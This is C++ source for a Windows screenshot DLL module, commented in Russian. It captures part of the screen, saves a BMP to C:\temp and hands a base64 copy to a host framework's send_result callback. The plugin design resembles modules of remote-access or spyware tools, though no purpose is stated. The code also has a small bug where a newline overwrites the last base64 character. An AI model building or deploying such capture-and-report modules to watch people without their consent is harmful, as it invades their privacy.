// Modules/Screenshot/screenshot.cpp — WITH LOCAL SAVE (VERIFICATION)
// Компиляция: cl /LD /MT /O2 screenshot.cpp /Fe:screenshot.dll gdi32.lib user32.lib crypt32.lib

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>

struct ModuleAPI {
    void (*send_result)(const unsigned char* data, unsigned long long len);
    void (*log)(const char* msg);
    const char* (*get_config)(const char* key);
};

// Хелпер для логов и создания папки
void hard_log(const char* msg) {
    CreateDirectoryA("C:\\temp", NULL);
    HANDLE hFile = CreateFileA("C:\\temp\\shot.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        SetFilePointer(hFile, 0, NULL, FILE_END);
        DWORD written;
        WriteFile(hFile, msg, (DWORD)strlen(msg), &written, NULL);
        CloseHandle(hFile);
    }
    OutputDebugStringA(msg);
}

extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
    hard_log("[SHOT] === VERIFICATION START ===\n");
    if (!api || !api->send_result) return -1;

    // 1. Параметры (оставим 320x200 для безопасности сети, но можно вернуть любые)
    int w = 320, h = 200;
    hard_log("[SHOT] OK: Params\n");

    // 2. GDI
    HDC hScreen = GetDC(NULL);
    if (!hScreen) { hard_log("[SHOT] FAIL: GetDC\n"); return -1; }
    
    HDC hMemDC = CreateCompatibleDC(hScreen);
    if (!hMemDC) { ReleaseDC(NULL, hScreen); hard_log("[SHOT] FAIL: MemDC\n"); return -1; }

    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
    if (!hBitmap) { DeleteDC(hMemDC); ReleaseDC(NULL, hScreen); hard_log("[SHOT] FAIL: Bitmap\n"); return -1; }

    HBITMAP hOld = (HBITMAP)SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);
    hard_log("[SHOT] OK: BitBlt\n");

    // 3. Alloc Pixels
    int stride = ((w * 3 + 3) / 4) * 4;
    int size = stride * h;
    unsigned char* pixels = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, size);
    if (!pixels) { hard_log("[SHOT] FAIL: Heap Pixels\n"); return -1; }

    // 4. GetDIBits
    BITMAPINFO bi = {0};
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 24;
    bi.bmiHeader.biCompression = BI_RGB;

    int lines = GetDIBits(hMemDC, hBitmap, 0, h, pixels, &bi, DIB_RGB_COLORS);
    
    // Cleanup GDI
    SelectObject(hMemDC, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    ReleaseDC(NULL, hScreen);

    if (lines == 0) {
        HeapFree(GetProcessHeap(), 0, pixels);
        hard_log("[SHOT] FAIL: GetDIBits\n");
        return -1;
    }
    hard_log("[SHOT] OK: GetDIBits\n");

    // 5. Build BMP in Memory
    BITMAPFILEHEADER bfh = {0};
    bfh.bfType = 0x4D42; // 'BM'
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize = bfh.bfOffBits + size;

    unsigned char* bmp = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, bfh.bfSize);
    if (!bmp) { HeapFree(GetProcessHeap(), 0, pixels); hard_log("[SHOT] FAIL: Heap BMP\n"); return -1; }

    int offset = 0;
    memcpy(bmp + offset, &bfh, sizeof(bfh)); offset += sizeof(bfh);
    memcpy(bmp + offset, &bi.bmiHeader, sizeof(BITMAPINFOHEADER)); offset += sizeof(BITMAPINFOHEADER);
    memcpy(bmp + offset, pixels, size);
    
    HeapFree(GetProcessHeap(), 0, pixels);
    hard_log("[SHOT] OK: BMP Built\n");

    // === НОВАЯ ФУНКЦИЯ: СОХРАНЕНИЕ НА ДИСК ===
    CreateDirectoryA("C:\\temp", NULL);
    HANDLE hBmpFile = CreateFileA("C:\\temp\\screenshot.bmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hBmpFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hBmpFile, bmp, bfh.bfSize, &written, NULL);
        CloseHandle(hBmpFile);
        hard_log("[SHOT] SAVED TO C:\\temp\\screenshot.bmp\n");
    }
    // =========================================

    // 6. Base64
    DWORD b64_len = 0;
    if (!CryptBinaryToStringA(bmp, bfh.bfSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &b64_len)) {
        HeapFree(GetProcessHeap(), 0, bmp);
        hard_log("[SHOT] FAIL: Base64 Len\n");
        return -1;
    }

    unsigned char* b64 = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, b64_len);
    if (!b64) { HeapFree(GetProcessHeap(), 0, bmp); hard_log("[SHOT] FAIL: Heap B64\n"); return -1; }

    if (!CryptBinaryToStringA(bmp, bfh.bfSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, (char*)b64, &b64_len)) {
        HeapFree(GetProcessHeap(), 0, b64); HeapFree(GetProcessHeap(), 0, bmp);
        hard_log("[SHOT] FAIL: Base64 Enc\n");
        return -1;
    }
    HeapFree(GetProcessHeap(), 0, bmp);
    hard_log("[SHOT] OK: Base64\n");

    // 7. Send
    const char prefix[] = "SCREENSHOT:";
    int prefix_len = 11;
    int total = prefix_len + (int)b64_len;
    unsigned char* out = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, total);
    
    if (out) {
        memcpy(out, prefix, prefix_len);
        memcpy(out + prefix_len, b64, b64_len);
        out[total - 1] = '\n';
        
        hard_log("[SHOT] SENDING...\n");
        api->send_result(out, total);
        hard_log("[SHOT] SENT OK\n");
        
        HeapFree(GetProcessHeap(), 0, out);
    }
    HeapFree(GetProcessHeap(), 0, b64);
    
    hard_log("[SHOT] === DONE ===\n");
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}